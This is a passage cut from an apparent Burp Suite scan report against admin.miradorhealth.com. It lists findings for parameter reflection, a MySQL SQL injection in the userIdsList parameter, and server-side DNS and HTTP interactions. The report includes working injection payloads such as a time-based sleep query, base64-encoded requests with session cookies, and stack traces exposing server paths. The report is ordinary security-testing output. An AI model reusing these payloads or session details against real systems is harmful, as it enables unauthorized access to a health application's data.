    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>typeId</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvRGFzaGJvYXJkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1waTJnbzhoMGg0cm1sbGwwcmltcHU4Z2Qybzsgc2NyZWVuV2lkdGg9ODAwOyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QjhBelR1MHJMYzNrRHFxdVRJcGZVaWJaQkRhd1BucEUvUlhBM0VVUlhLNjlmbUVZN1E4cHVWV2tsdW95NWE3TU1XNWp3TzJQQzV4Qjlnb0YxU2pHNko1L2VwaDBWc1B2cFpLeUJrUXE2RjNjWkRsY2w3aVZKUDRGV1crcTsgQVdTQUxCQ09SUz1COEF6VHUwckxjM2tEcXF1VElwZlVpYlpCRGF3UG5wRS9SWEEzRVVSWEs2OWZtRVk3UThwdVZXa2x1b3k1YTdNTVc1andPMlBDNXhCOWdvRjFTakc2SjUvZXBoMFZzUHZwWkt5QmtRcTZGM2NaRGxjbDdpVkpQNEZXVytxDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KdHlwZT1zdGFmZlVzZXImdHlwZUlkPTFqdHVhcXZpNXJ3JnVzZXJJZHNMaXN0JTVCJTVEPTM5OSZkdXJhdGlvbj1Nb250aGx5]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1MzoyNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogOTA0DQpTZXQtQ29va2llOiBBV1NBTEI9N1A0Mm5hYXRHWEhNSWpiOWI4enI4M3IzdXBuaTJHQ0JKMnRIREdaS3oxQ0xvSkk2cDlJbWN3Tk90QTcyZVhoQTdtTitKemdvcndBUkcvM09ZSGJpZWxnKy9JbndQaURpWm1Ua29tcVp6UmhJZFJJQWxDYmF6UkIzTUVoYzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjUzOjI2IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPTdQNDJuYWF0R1hITUlqYjliOHpyODNyM3VwbmkyR0NCSjJ0SERHWkt6MUNMb0pJNnA5SW1jd05PdEE3MmVYaEE3bU4rSnpnb3J3QVJHLzNPWUhiaWVsZysvSW53UGlEaVptVGtvbXFaelJoSWRSSUFsQ2JhelJCM01FaGM7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1MzoyNiBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJzFqdHVhcXZpNXJ3JyBpbiAnd2hlcmUgY2xhdXNlJyBpbiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDoyNApTdGFjayB0cmFjZToKIzAgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHAoMjQpOiBteXNxbGktJmd0O3F1ZXJ5KCdTRUxFQ1QgdXNlci5pZCAuLi4nKQojMSAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL21vZGVscy9Vc2VyLnBocCg4MzYpOiBEYlV0aWw6OmdldFNlbGVjdFJlc3VsdChPYmplY3QobXlzcWxpKSwgJ1NFTEVDVCB1c2VyLmlkIC4uLicpCiMyIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaGVscGVyL0Jhc2VIZWxwZXIucGhwKDI1NCk6IFVzZXI6OmdldFVzZXJJZHNCeVR5cGUoJzFqdHVhcXZpNXJ3JywgQXJyYXkpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vY29udHJvbGxlci9EYXNoYm9hcmRDb250cm9sbGVyLnBocCgzNDMpOiBCYXNlSGVscGVyLSZndDtnZXRVc2VyVlNPcmdhbml6YXRpb25Db21wbGlhbmNlVHJlbmREYXRhKCdnZXRNb250aGx5QWdyZWUuLi4nLCAnTW9udGhseScsIEFycmF5LCBBcnJheSwgJzFqdHVhcXZpNXJ3JykKIzQgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTE4KTogRGFzaGJvYXJkQ29udHJvbGxlci0mZ3Q7c2hvd0xpc3QoJ0Rhc2hib2FyZCcsIHRydWUsIHRydWUsIGZhbHNlLCBBcnJheSkKIzUge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>84959961154799616</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Dashboard]]></path>
    <location><![CDATA[/Dashboard [userIdsList%5B%5D parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li><li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li><li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li><li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>userIdsList%5B%5D</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the userIdsList%5B%5D parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the userIdsList%5B%5D parameter. The application timed out when responding to the request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvRGFzaGJvYXJkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1waTJnbzhoMGg0cm1sbGwwcmltcHU4Z2Qybzsgc2NyZWVuV2lkdGg9ODAwOyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9aUtkemhSai9rbWpBMWRZZHY0Wk5LV3ZScXI5NEtqLzJSTEF0OXRFK0FVY2p3YnI0NUlYZ0FCTE5SRzVMZFF5aFpWMDdNLzZna1d0NXphekFseDg4NzZZQ3V3bkdlcmd3ZzAybXpVZ2FKbGR3ZzUzT0JwQnlWemh4dHBJZzsgQVdTQUxCQ09SUz1pS2R6aFJqL2ttakExZFlkdjRaTktXdlJxcjk0S2ovMlJMQXQ5dEUrQVVjandicjQ1SVhnQUJMTlJHNUxkUXloWlYwN00vNmdrV3Q1emF6QWx4ODg3NllDdXduR2VyZ3dnMDJtelVnYUpsZHdnNTNPQnBCeVZ6aHh0cElnDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KdHlwZT1zdGFmZlVzZXImdHlwZUlkPTEmdXNlcklkc0xpc3QlNUIlNUQ9Mzk5JyZkdXJhdGlvbj1Nb250aGx5]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1NDoyNyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMTExNg0KU2V0LUNvb2tpZTogQVdTQUxCPWgybElHTHZseTNYZWFiREx4UDh4U24wQ3FheHROdThSSkpGOVMvcVFMZmZSNXhOMXQvNGJoYlZheGErYlBFeG9EZGJGK3dLQ1A0ODJOM0dQK01GMUNNaUdxNERUeXU2QVo3NnNqd2c3WXJ4NnJ2Y1ppcEVrL2hPMENMWE07IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1NDoyNyBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz1oMmxJR0x2bHkzWGVhYkRMeFA4eFNuMENxYXh0TnU4UkpKRjlTL3FRTGZmUjV4TjF0LzRiaGJWYXhhK2JQRXhvRGRiRit3S0NQNDgyTjNHUCtNRjFDTWlHcTREVHl1NkFaNzZzandnN1lyeDZydmNaaXBFay9oTzBDTFhNOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NTQ6MjcgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQo8YnIgLz4KPGI+RmF0YWwgZXJyb3I8L2I+OiAgVW5jYXVnaHQgbXlzcWxpX3NxbF9leGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycpIEdST1VQIEJZIFlFQVIodGFnX2hpc3RvcnkuY3JlYXRlZF9hdCksIE1PTlRIKHRhZ19oaXN0b3J5LmNyZWF0ZWRfYXQpIE9SREVSIEJZJyBhdCBsaW5lIDEgaW4gL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA6MjQKU3RhY2sgdHJhY2U6CiMwIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwKDI0KTogbXlzcWxpLSZndDtxdWVyeSgnU0VMRUNUIENPTkNBVChELi4uJykKIzEgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS9tb2RlbHMvVGFnSGlzdG9yeS5waHAoMjczKTogRGJVdGlsOjpnZXRTZWxlY3RSZXN1bHQoT2JqZWN0KG15c3FsaSksICdTRUxFQ1QgQ09OQ0FUKEQuLi4nKQojMiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2hlbHBlci9CYXNlSGVscGVyLnBocCgxOTcpOiBUYWdIaXN0b3J5OjpnZXRNb250aGx5QWdyZWVnYXRlcygnMjAyNC0wMS0wMScsICcyMDI0LTEyLTMxJywgQXJyYXksIE5VTEwsIEFycmF5KQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvRGFzaGJvYXJkQ29udHJvbGxlci5waHAoMzQzKTogQmFzZUhlbHBlci0mZ3Q7Z2V0VXNlclZTT3JnYW5pemF0aW9uQ29tcGxpYW5jZVRyZW5kRGF0YSgnZ2V0TW9udGhseUFncmVlLi4uJywgJ01vbnRobHknLCBBcnJheSwgQXJyYXksICcxJykKIzQgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTE4KTogRGFzaGJvYXJkQ29udHJvbGxlci0mZ3Q7c2hvd0xpc3QoJ0Rhc2hib2FyZCcsIHRydWUsIHRydWUsIGZhbHNlLCBBcnJheSkKIzUge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvRGFzaGJvYXJkIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1waTJnbzhoMGg0cm1sbGwwcmltcHU4Z2Qybzsgc2NyZWVuV2lkdGg9ODAwOyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9TXdnRzRVc2tKTVJiTFJsVE1WZnlUWkhvbjZKbVA0UUpNdHBZSHpQWnFQTHZOQmVZZW9UQzNZZjVlWi9IL1gvRjdNTXlNS2twd3huanI5dFFORllRbndGZXFZTUZaUElRT3lLbENGVmd5RlF4WG9oVzFnUGtsYjlqNklZaTsgQVdTQUxCQ09SUz1Nd2dHNFVza0pNUmJMUmxUTVZmeVRaSG9uNkptUDRRSk10cFlIelBacVBMdk5CZVllb1RDM1lmNWVaL0gvWC9GN01NeU1La3B3eG5qcjl0UU5GWVFud0ZlcVlNRlpQSVFPeUtsQ0ZWZ3lGUXhYb2hXMWdQa2xiOWo2SVlpDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNjINCg0KdHlwZT1zdGFmZlVzZXImdHlwZUlkPTEmdXNlcklkc0xpc3QlNUIlNUQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJmR1cmF0aW9uPU1vbnRobHk=]]></request>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6493540208162700288</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Dashboard]]></path>
    <location><![CDATA[/Dashboard]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>mqg1wnh2cjjx4hdu915uutuwlnrhf8312psci07.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG1xZzF3bmgyY2pqeDRoZHU5MTV1dXR1d2xucmhmODMxMnBzY2kwNy5vYXN0aWZ5LmNvbQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG5vLXRyYW5zZm9ybQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:41:12.704 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>mqg1wnh2cjjx4hdu915uutuwlnrhf8312psci07.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>7917552262166756352</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/Dashboard]]></path>
    <location><![CDATA[/Dashboard]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>mqg1wnh2cjjx4hdu915uutuwlnrhf8312psci07.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG1xZzF3bmgyY2pqeDRoZHU5MTV1dXR1d2xucmhmODMxMnBzY2kwNy5vYXN0aWZ5LmNvbQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG5vLXRyYW5zZm9ybQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
